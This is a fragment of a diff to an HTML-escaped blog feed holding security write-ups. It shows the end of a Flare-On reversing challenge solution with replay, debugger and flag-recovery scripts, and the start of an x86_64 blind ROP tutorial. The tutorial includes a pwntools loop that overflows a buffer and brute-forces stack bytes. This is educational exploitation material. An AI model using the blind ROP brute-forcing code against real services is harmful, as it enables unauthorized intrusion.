-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'connected&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'connected&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'stream0_data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 			&lt;span class=&quot;n&quot;&gt;pause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data sent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'data sent'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;next we breakpoint after the decompression of the gzip data, note that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esi&lt;/code&gt; contains the address of the decrypted data.&lt;/p&gt;
@@ -1433,7 +1662,7 @@ the next picture shows the first &lt;strong&gt;0x30&lt;/strong&gt; data sent fro
 &lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;                    &lt;span class=&quot;c1&quot;&gt;# so I used it as a break
 &lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#print decrypted data
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resume_process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#iterate the loop till the next decryption
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wait_for_next_event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#wait process until it hits the breakpoint&lt;/span&gt;
@@ -1509,20 +1738,20 @@ the next picture shows the first &lt;strong&gt;0x30&lt;/strong&gt; data sent fro
 11
 &lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'level9.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;  
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'level9.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;  
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]):&lt;/span&gt;
 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 			&lt;span class=&quot;n&quot;&gt;pix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall11/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;If you liked my writeup, please take a look at my &lt;a href=&quot;https://github.com/soolidsnake&quot;&gt;github repo&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">x86_64 Blind Rop</title><link href="http://localhost:4000/2018/07/15/blindx86_64_rop.html" rel="alternate" type="text/html" title="x86_64 Blind Rop" /><published>2018-07-15T05:22:06-05:00</published><updated>2018-07-15T05:22:06-05:00</updated><id>http://localhost:4000/2018/07/15/blindx86_64_rop</id><content type="html" xml:base="http://localhost:4000/2018/07/15/blindx86_64_rop.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;If you liked my writeup, please take a look at my &lt;a href=&quot;https://github.com/soolidsnake&quot;&gt;github repo&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">x86_64 Blind Rop</title><link href="http://localhost:4000/2018/07/15/blindx86_64_rop.html" rel="alternate" type="text/html" title="x86_64 Blind Rop" /><published>2018-07-15T12:22:06+02:00</published><updated>2018-07-15T12:22:06+02:00</updated><id>http://localhost:4000/2018/07/15/blindx86_64_rop</id><content type="html" xml:base="http://localhost:4000/2018/07/15/blindx86_64_rop.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;p&gt;Hoy, in this post I will introduce you to an advanced exploitation technique called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blind rop&lt;/code&gt;, so what is a blind rop?&lt;/p&gt;
 
@@ -1596,26 +1825,26 @@ Here is a small snippet of code:&lt;/p&gt;
 
 			&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	
 			
-			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'(chocolate/beer/hamburger): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'(chocolate/beer/hamburger): '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'are out of stock&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'are out of stock&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 			&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 
-				&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
 			&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-				&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 				&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
 
 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Bye!'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 				&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 				&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-				&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;With this we can extract most information we need&lt;/p&gt;
@@ -1683,25 +1912,25 @@ The idea is to chain a rop gadget like the following:&lt;/p&gt;
 		&lt;span class=&quot;c1&quot;&gt;# for pop rsi ; pop r15 ; ret
